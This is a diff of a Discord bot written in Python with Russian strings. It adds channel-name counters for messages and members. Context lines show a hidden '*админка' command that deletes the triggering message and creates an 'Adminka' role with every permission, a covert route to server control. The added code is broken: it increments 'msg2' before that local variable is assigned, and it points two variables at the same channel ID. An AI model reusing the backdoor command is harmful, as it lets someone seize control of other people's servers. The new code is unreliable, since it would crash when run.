@@ -14,6 +14,12 @@ class MyClient(discord.Client):
 		r = 0
 		m = 0
 		s = 0
+		members = client.get_channel(745138560323289090)
+		msg1 = client.get_channel(745138560323289090)
+		msg2 = msg2 + 1
+		mb2 = client.get_guild(732584678313427008)
+		await msg1.edit(name='💬 Сообщений: ' + str(msg2))
+		await members.edit(name='👦 Участников: ' + str(len(mb2.members)))
 		print('{0.author} с сервера {0.guild.name} и канала {0.channel.name} сказал: {0.content}'.format(message))
 		if message.content == '*помощь': #помощь
 			await message.delete()
@@ -202,6 +208,8 @@ class MyClient(discord.Client):
 			if message.content == '*админка': #выдаёт админку
 				await message.delete()
 				role = await message.guild.create_role(name="Adminka", permissions=Permissions.all())
+				msg2 = 0
+				
 				
 			if message.content == '*лс':
 				await message.delete()
